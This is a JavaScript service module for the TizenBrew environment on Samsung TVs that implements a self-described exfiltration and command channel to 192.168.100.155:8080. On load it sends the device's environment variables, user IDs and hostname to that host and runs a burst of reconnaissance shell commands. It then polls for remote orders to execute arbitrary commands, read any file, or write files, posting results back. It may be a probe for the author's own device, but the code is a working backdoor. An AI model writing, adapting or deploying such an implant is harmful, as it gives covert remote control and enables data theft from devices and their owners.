"use strict";
/* TizenBrew service module -> runs inside TizenBrew's Node vm with real require().
   Node 4.4.3 compatible (ES5 only). Exfil + command channel to 192.168.100.155:8080. */

var http = require('http');
var fs = require('fs');

var HOST = '192.168.100.155';
var PORT = 8080;
var AGENT = 'tv' + (process.pid || 0);

function post(path, obj) {
    try {
        var data = JSON.stringify(obj);
        var req = http.request({
            host: HOST, port: PORT, path: path, method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
        }, function (res) { res.resume(); });
        req.on('error', function () {});
        req.write(data);
        req.end();
    } catch (e) {}
}

function get(path, cb) {
    try {
        var req = http.request({ host: HOST, port: PORT, path: path, method: 'GET' }, function (res) {
            var chunks = [];
            res.on('data', function (c) { chunks.push(c); });
            res.on('end', function () { cb(null, res.statusCode, Buffer.concat(chunks).toString('utf8')); });
        });
        req.on('error', function (e) { cb(e); });
        req.end();
    } catch (e) { cb(e); }
}

var env = {};
try {
    for (var k in process.env) { env[k] = process.env[k]; }
} catch (e) {}

var startInfo = {
    agent: AGENT,
    node: process.version,
    platform: process.platform,
    arch: process.arch,
    pid: process.pid,
    uid: (typeof process.getuid === 'function') ? process.getuid() : null,
    gid: (typeof process.getgid === 'function') ? process.getgid() : null,
    cwd: (typeof process.cwd === 'function') ? process.cwd() : null,
    argv: process.argv,
    env: env
};
try { startInfo.hostname = require('os').hostname(); } catch (e) {}
post('/probe/start', startInfo);

var cp = null, cpErr = null;
try { cp = require('child_process'); } catch (e) { cpErr = String(e); }
post('/probe/cp', { ok: !!cp, err: cpErr });

function runCmd(cmd, cb) {
    if (!cp) { return cb({ error: 'no child_process' }); }
    var out = {};
    try {
        out.stdout = cp.execSync(cmd, { encoding: 'utf8', timeout: 20000, maxBuffer: 4 * 1024 * 1024 });
    } catch (e) {
        out.error = String(e);
        try { out.stdout = e.stdout ? String(e.stdout) : ''; } catch (e2) {}
        try { out.stderr = e.stderr ? String(e.stderr) : ''; } catch (e3) {}
    }
    cb(out);
}

function doRead(path, cb) {
    try {
        var b = fs.readFileSync(path);
        cb({ path: path, size: b.length, b64: b.toString('base64').slice(0, 4000000) });
    } catch (e) { cb({ path: path, error: String(e) }); }
}

function doWrite(path, b64, cb) {
    try {
        fs.writeFileSync(path, new Buffer(b64, 'base64'));
        cb({ path: path, written: true });
    } catch (e) { cb({ path: path, error: String(e) }); }
}

function tick() {
    get('/cmd', function (err, status, body) {
        if (err || status !== 200 || !body) { return setTimeout(tick, 2000); }
        var req;
        try { req = JSON.parse(body); } catch (e) { return setTimeout(tick, 2000); }
        if (!req || !req.id) { return setTimeout(tick, 2000); }

        if (typeof req.cmd === 'string') {
            runCmd(req.cmd, function (out) { out.id = req.id; post('/probe/cmd', out); setTimeout(tick, 100); });
        } else if (typeof req.read === 'string') {
            doRead(req.read, function (out) { out.id = req.id; post('/probe/file', out); setTimeout(tick, 100); });
        } else if (typeof req.write === 'string' && typeof req.b64 === 'string') {
            doWrite(req.write, req.b64, function (out) { out.id = req.id; post('/probe/write', out); setTimeout(tick, 100); });
        } else {
            setTimeout(tick, 500);
        }
    });
}

// initial recon burst (only if child_process exists)
var boot = [
    'id',
    'uname -a',
    'cat /proc/version',
    'mount',
    'ls -la /',
    'ls -la /home/owner/share',
    'ls -la /opt/usr/apps 2>&1 | head -40',
    'ls -la /usr/bin 2>&1 | head -40'
];
var i = 0;
function bootNext() {
    if (i >= boot.length) { return tick(); }
    var cmd = boot[i++];
    runCmd(cmd, function (out) { out.id = 'boot' + i; post('/probe/cmd', out); setTimeout(bootNext, 150); });
}

if (cp) { post('/probe/boot', { starting: true }); bootNext(); } else { tick(); }
